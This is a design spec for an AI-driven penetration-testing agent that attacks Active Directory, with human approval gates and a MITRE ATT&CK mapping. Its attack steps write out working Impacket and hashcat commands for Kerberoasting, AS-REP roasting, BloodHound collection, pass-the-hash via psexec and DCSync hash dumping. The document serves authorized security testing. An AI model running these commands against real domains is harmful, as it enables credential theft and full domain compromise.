# Task 020: Active Directory Attack Agent

**Phase**: Phase 5
**Wave**: Wave 2 — after credential feedback loop (needs initial credential)
**Depends on**: task-019 (network-recon), Phase 3 cred-intel (task-011)
**Labels**: phase5, agent, network, active

## Why This Matters

90% of enterprise breaches involve Active Directory. Domain Controllers hold every
credential in the organization. A single misconfigured service account can be the
path from "web app user" to "Domain Admin in 3 steps."

Existing automated tools (BloodHound, Impacket) require manual setup and operator
knowledge. `ad-attack` wraps all of this — Kerberoasting, AS-REP Roasting,
BloodHound path analysis — into an automated agent that runs after initial access
and tells you exactly how far you can go.

**Every destructive step requires human approval.** No exceptions.

## What to Build

### Agent: `ad-attack`

**Agent definition**:
```typescript
'ad-attack': {
  prerequisites: ['network-recon', 'cred-intel'],
  promptTemplate: 'ad-attack',
  deliverableFilename: 'ad_attack_deliverable.md',
  modelTier: 'large',
  required_mode: 'active',
},
```

**Prompt file**: `apps/worker/prompts/ad-attack.txt`

---

### Conditional Trigger

Only runs if network-recon found domain controller indicators:
```typescript
const networkDeliverable = await loadDeliverable('network_recon_deliverable.md');

if (networkDeliverable.topology.domain_controllers.length === 0) {
  log.info('ad-attack: no domain controllers found — skipping');
  return skipResult();
}
```

---

### Human Approval Gate

```typescript
// apps/worker/src/services/human-approval.ts — NEW
export async function humanApprovalGate(options: {
  action: string;
  evidence: string;
  risk: string;
}): Promise<boolean> {
  // Block workflow execution, surface prompt to CLI
  const approved = await inquirer.prompt([{
    type: 'confirm',
    name: 'approved',
    message: `\n[APPROVAL REQUIRED]\nAction: ${options.action}\nEvidence: ${options.evidence}\nRisk: ${options.risk}\n\nApprove?`,
    default: false,
  }]);
  return approved.approved;
}
```

---

### Attack Steps

**Step 0 — LDAP Enumeration** (no gate — read-only):
```
impacket-GetADUsers -dc-ip <dc-ip> -all <domain>/<user>:<pass>
impacket-GetADComputers
impacket-GetADGroups
→ Find: kerberoastable accounts (servicePrincipalName set)
→ Find: ASREPRoastable accounts (DONT_REQ_PREAUTH flag)
→ Find: AdminCount=1 accounts (high-value targets)
→ Find: Unconstrained delegation hosts
```

**Step 1 — Kerberoasting** [APPROVAL GATE]:
```
Action: "Request TGS tickets for <N> kerberoastable service accounts"
Risk: "Generates Kerberos TGS events (4769) in Windows Security log"

impacket-GetUserSPNs -dc-ip <dc-ip> -request <domain>/<user>:<pass>
→ Saves .kirbi hashes
hashcat -a 0 -m 13100 hashes.txt /wordlists/rockyou.txt (60s timeout)
→ If cracked: write to CredentialStore
```

**Step 2 — AS-REP Roasting** [APPROVAL GATE]:
```
Action: "Request AS-REP for <N> pre-auth-disabled accounts"
Risk: "Generates Kerberos AS request events (4768)"

impacket-GetNPUsers -dc-ip <dc-ip> <domain>/ -no-pass
hashcat -a 0 -m 18200 asrep_hashes.txt /wordlists/rockyou.txt
→ If cracked: write to CredentialStore
```

**Step 3 — BloodHound Path Analysis** [APPROVAL GATE]:
```
Action: "Run BloodHound collector — queries LDAP for all AD objects"
Risk: "Creates ~1000 LDAP queries — visible in DC audit log"

bloodhound-python -u <user> -p <pass> -d <domain> -c all --zip
→ Import to BloodHound
→ Find shortest path to Domain Admin
→ Export attack path: user → group → host → DA in N hops
```

**Step 4 — Pass-the-Hash / Pass-the-Ticket** [APPROVAL GATE — requires cracked hash]:
```
Action: "Authenticate as <account> using NTLM hash (no plaintext password)"
Risk: "Authentication event in Security log, possible alert on PTH"

impacket-psexec <domain>/<user> -hashes :<ntlm_hash> <target_host>
→ If success: shell on target host, note access level
→ IMMEDIATELY exit — do not explore further without another gate
```

**Step 5 — DCSync Simulation** [APPROVAL GATE — highest risk]:
```
Action: "Simulate Domain Controller sync to retrieve NTLM hashes"
Risk: "Triggers DS-Replication-Get-Changes audit event — very high visibility"
Requirement: Must have domain admin / replication rights

impacket-secretsdump <domain>/<user>:<pass>@<dc-ip>
→ IMMEDIATELY abort after proof of access
→ NEVER store retrieved hashes beyond proof-of-concept line
→ Note: "DCSync possible — would expose all domain credentials"
```

---

### MITRE ATT&CK Mapping

| Step | ATT&CK Technique | Tactic |
|---|---|---|
| LDAP Enum | T1087.002 — Account Discovery: Domain Account | Discovery |
| Kerberoasting | T1558.003 — Steal or Forge Kerberos Tickets: Kerberoasting | Credential Access |
| AS-REP Roasting | T1558.004 — AS-REP Roasting | Credential Access |
| BloodHound | T1482 — Domain Trust Discovery | Discovery |
| Pass-the-Hash | T1550.002 — Use Alternate Authentication Material: PTH | Lateral Movement |
| DCSync | T1003.006 — OS Credential Dumping: DCSync | Credential Access |

---

## Files to Create/Change

- `apps/worker/prompts/ad-attack.txt` — NEW
- `apps/worker/src/services/human-approval.ts` — NEW: approval gate service
- `apps/worker/src/session-manager.ts` — add agent definition
- `apps/worker/src/types/agents.ts` — add to ALL_AGENTS
- `apps/worker/src/temporal/activities.ts` — add activity wrapper
- `apps/worker/src/temporal/workflows.ts` — conditional on DC detection

## Acceptance Criteria

- [ ] Skips gracefully if no domain controllers found in network-recon output
- [ ] Every Step 1-5 requires human approval via CLI prompt — cannot be bypassed
- [ ] Kerberoasting step aborts if engagement mode is not `active`
- [ ] DCSync step has additional hard confirmation beyond normal gate
- [ ] All steps tagged with MITRE ATT&CK in deliverable
- [ ] Cracked credentials written to CredentialStore for use by other agents
- [ ] `pnpm run check` passes

## Notes

- Impacket and BloodHound are already in the Kali container
- rockyou.txt wordlist must be in the container at `/wordlists/rockyou.txt`
- 60-second hashcat timeout — this is not meant to be a full crack session
- Step 5 (DCSync) requires explicit double-confirmation — add a SECOND approval prompt
- Pass-the-Hash output: if shell obtained, exit immediately — do not explore
